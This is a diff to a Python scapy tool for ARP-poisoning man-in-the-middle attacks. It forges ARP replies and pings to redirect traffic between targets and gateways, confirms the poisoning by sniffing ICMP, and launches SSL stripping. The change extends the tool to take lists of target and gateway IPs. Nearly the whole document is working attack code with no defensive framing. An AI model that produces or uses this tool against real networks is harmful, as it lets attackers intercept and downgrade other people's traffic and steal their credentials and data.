@@ -1,3 +1,4 @@
+from click import option
 from scapy.all import *
 load_layer("http") 
 load_layer("dns") 
@@ -24,8 +25,8 @@ PORT_STEAL_SEND_DELAY = 2000  # microseconds
 
 def get_arguments():
     parser = argparse.ArgumentParser()
-    parser.add_argument("-t", "--target", dest="target", help="Target IP")
-    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP")
+    parser.add_argument("-t", "--target", dest="targets", required=True, nargs="+", help="Array of target IPs") # if you want to be able to add more 
+    parser.add_argument("-g", "--gateway", dest="gateways", required=True, nargs="+", help="Array of gateway IPs")
     parser.add_argument("-i", "--iface", dest="iface", default="enp0s3", help="Interface [default: %(default)]")
 
     parser.add_argument("-d", "--dns-spoof", dest="dns-spoof", default=False, help="dns-spoof [default: %(default)]")
@@ -36,23 +37,6 @@ def get_arguments():
     return options
 
 options = get_arguments()
-
-poison_thread = 0
-poison_confirm_thread = 0
-read_packets_thread = 0
-
-
-
-# arp = Ether() / ARP()
-# arp[Ether].src = ATTACKER_MAC
-# arp[ARP].hwsrc = ATTACKER_MAC
-# arp[ARP].psrc = ipToSpoof
-# arp[ARP].hwdst = macVictim
-# arp[ARP].pdst = ipVictim
-
-# sendp(arp, iface=options.iface)
-
-
 
 def get_mac(ip):
     arp_request_broadcast = build_ether("ff:ff:ff:ff:ff:ff")/ARP(pdst=ip) # Broadcast MAC address: ff:ff:ff:ff:ff:ff
@@ -69,41 +53,42 @@ def build_icmp_echo():
     icmp = ICMP()
     return icmp
 
-def build_arp(victim_dst_ip, victim_src_ip, victim_src_mac, attacker_mac, mode):
+def build_arp(victim_ip, from_ip, from_mac, attacker_mac, mode):
     arp = ARP()
     arp.hwsrc = attacker_mac
-    arp.psrc = victim_dst_ip
-    arp.hwdst = victim_src_mac
-    arp.pdst = victim_src_ip
+    arp.psrc = victim_ip
+    arp.hwdst = from_mac
+    arp.pdst = from_ip
     arp.op = mode # 1 for request, 2 for reply
     return arp
 
-def forge_l2_ping(victim_src_ip, victim_dst_ip, victim_dst_mac):
+def forge_l2_ping(victim_ip, from_ip, from_mac):
     # ping = build_ether(macVictim) / IP(dst=ipVictim) / build_icmp_echo()
-    ping = Ether(src=ATTACKER_MAC, dst=victim_dst_mac)/IP(src=victim_src_ip, dst=victim_dst_ip)/ICMP()
+    ping = Ether(src=ATTACKER_MAC, dst=from_mac)/IP(src=victim_ip, dst=from_ip)/ICMP()
     return ping
 
 
-def forge_arp(victim_dst_ip, victim_src_ip, victim_src_mac, attacker_mac, mode):
+def forge_arp(victim_ip, from_ip, from_mac, attacker_mac, mode):
     # arp = build_ether(macVictim) / IP(dst=ipVictim) / build_icmp_echo()
-    arp = build_ether(attacker_mac)/build_arp(victim_dst_ip, victim_src_ip, victim_src_mac, attacker_mac, mode)
+    arp = build_ether(attacker_mac)/build_arp(victim_ip, from_ip, from_mac, attacker_mac, mode)
     return arp
 
-def arp_poison(victims1, victims2):
+def arp_poison(targets, gateways):
  while True:
     try:
         print("[*] Sending ARP poison packets...") if options.verbose else 0
         
-        for victimAdr in victims1:
-            for spoofAdr in victims2:
-                if(victimAdr == spoofAdr):
+        for victim_address in targets:
+            for from_address in gateways:
+                if(victim_address == from_address):
                     print("[*] Skipping same IPs...") if options.verbose else 0
                     continue
 
-                icmp = forge_l2_ping(spoofAdr.ip, victimAdr.ip, victimAdr.mac)
+                icmp = forge_l2_ping(from_address.ip, victim_address.ip, victim_address.mac)
                 sendp(icmp, iface=options.iface, verbose=options.verbose)
 
-                arp = forge_arp(spoofAdr.ip, victimAdr.ip, victimAdr.mac, ATTACKER_MAC, 2)
+                # Create ARP poison packet to send all packets from from_address to this pc if packet is for victim
+                arp = forge_arp(victim_address.ip, from_address.ip, from_address.mac, ATTACKER_MAC, 2)
                 sendp(arp, iface=options.iface, verbose=options.verbose)
 
                 arp[ARP].op = 1
@@ -116,7 +101,7 @@ def arp_poison(victims1, victims2):
 
     time.sleep(ARP_POISON_WARM_UP)
 
-def poison_confirm(victims1, victims2):
+def poison_confirm(targets, gateways):
     while True:
         pkt = sniff(filter="icmp", count=1)
         # print("[*] Received ARP packet:")
@@ -135,28 +120,31 @@ def main():
     global ATTACKER_MAC
     ATTACKER_MAC = get_if_hwaddr(options.iface)
 
-    victims1 = []
-    victims2 = []
+    targets = []
+    gateways = []
     
-    target_mac = get_mac(options.target)
-    gateway_mac = get_mac(options.gateway)
+    for target in options.targets:
+        target_mac = get_mac(target)
+        if(target_mac == 0):
+            print("[!] MAC of Target: {} not found".format(target))
+            sys.exit(0)
+        targets.append(type('obj', (object,), {"mac": target_mac, "ip": target}))
+        
+    for gateway in options.gateways:
+        gateway_mac = get_mac(gateway)
+        if(gateway_mac == 0):
+            print("[!] MAC of Gateway: {} not found".format(gateway))
+            sys.exit(0)
+        gateways.append(type('obj', (object,), {"mac": gateway_mac, "ip": gateway}))
 
-    if(target_mac == 0):
-        print("[!] Target MAC not found")
-        sys.exit(0)
-    if(gateway_mac == 0):
-        print("[!] Gateway MAC not found")
-        sys.exit(0)
 
-    victims2.append(type('obj', (object,), {"mac": gateway_mac, "ip": options.gateway}))
-    victims1.append(type('obj', (object,), {"mac": target_mac, "ip": options.target}))
-    # victims2.append((get_mac(options.target), options.target))
-    # victims2.append((get_mac(options.gateway), options.gateway))
+    # gateways.append((get_mac(options.target), options.target))
+    # gateways.append((get_mac(options.gateway), options.gateway))
 
-    print("[*] Target IP: " + victims1[0].ip)
-    print("[*] Target MAC: " + victims1[0].mac)
-    print("[*] Gateway IP: " + victims2[0].ip)
-    print("[*] Gateway MAC: " + victims2[0].mac)
+    print("[*] Target IP: " + targets[0].ip)
+    print("[*] Target MAC: " + targets[0].mac)
+    print("[*] Gateway IP: " + gateways[0].ip)
+    print("[*] Gateway MAC: " + gateways[0].mac)
 
     print("[*] Attacker IP: " + ATTACKER_IP)
     print("[*] Attacker MAC: " + ATTACKER_MAC)
@@ -165,14 +153,14 @@ def main():
     
 
     #use daemon=True to run in background and stop when application quits
-    poison_thread =  threading.Thread(target=arp_poison, args=(victims1, victims2), daemon=True).start()
-    poison_confirm_thread = threading.Thread(target=poison_confirm, args=(victims1, victims2), daemon=True).start()
+    poison_thread =  threading.Thread(target=arp_poison, args=(targets, gateways), daemon=True).start()
+    poison_confirm_thread = threading.Thread(target=poison_confirm, args=(targets, gateways), daemon=True).start()
 
     time.sleep(ARP_POISON_WARM_UP)
 
     if(options.ssl_strip):
         print("[*] Starting SSL strip thread...")
-        vic = victims1 + victims2
+        vic = targets + gateways
 
         packet_sniffer.main(ssl_strip.check_packet, vic, ATTACKER_MAC, options)
 
